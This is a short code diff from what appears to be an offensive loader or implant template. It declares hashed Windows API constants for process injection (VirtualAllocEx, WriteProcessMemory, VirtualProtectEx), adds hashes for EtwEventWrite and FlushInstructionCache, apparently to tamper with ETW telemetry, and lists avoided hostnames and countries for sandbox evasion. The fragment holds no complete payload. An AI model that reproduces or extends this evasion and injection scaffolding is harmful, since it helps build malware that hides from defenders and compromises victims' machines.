@@ -31,6 +31,10 @@ const ObjHash VIRTUAL_ALLOC_HASH = %FCTHASH__VirtualAllocEx%;
 const ObjHash WRITE_MEMORY_HASH = %FCTHASH__WriteProcessMemory%;
 const ObjHash VIRTUAL_PROTECT_HASH = %FCTHASH__VirtualProtectEx%;
 
+// ETW
+const ObjHash ETW_EVENT_WRITE_HASH = %FCTHASH__EtwEventWrite%;
+const ObjHash FLUSH_INSTRUCTION_CACHE_HASH = %FCTHASH__FlushInstructionCache%;
+
 // statical arrays and sizes for avoided hostnames and countries
 const ObjHash TARGET_HOSTNAME_PREFIX_HASH = %SANDBOX__TARGET_HOSTNAME%;
 const ObjHash AVOIDED_HOSTNAME_PREFIX_HASHES[] = {
